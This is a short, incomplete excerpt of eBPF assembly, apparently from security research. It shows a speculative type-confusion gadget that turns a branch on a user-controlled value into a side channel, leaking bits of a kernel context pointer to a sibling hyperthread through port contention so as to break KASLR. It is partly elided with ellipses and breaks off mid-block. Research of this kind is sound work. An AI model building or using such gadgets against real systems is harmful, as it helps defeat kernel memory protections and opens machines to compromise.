...
.Ltmp71:
	#
    # Gadget for Spec. Type Confusion
	#
	# Program state:
	# r1: skb->ifindex
	# r6: ctx_ptr skb
	...
	if r1 == 0 goto R2_UNKNOWN # branch based on user input
	r2 = 1   # needed to prevent dead-code-elim. for port-contention block
R2_UNKNOWN:
	if r1 == 0 goto R1ZERO_OR_R2PTR
	r2 = r6 # ctx_ptr
R1ZERO_OR_R2PTR:
	if r1 != 0 goto	LEGAL
	#
	# Leak ctx_ptr to SMT-silbling using ADD port-contention, break KASLR.
	r2 &= 1  # choose bit to leak
	# Verifier rejects this:
	# R2 bitwise operator &= on pointer prohibited
	if r2 == 0 goto	NO_CONTENTION
	r0 += 1
	r0 += 1
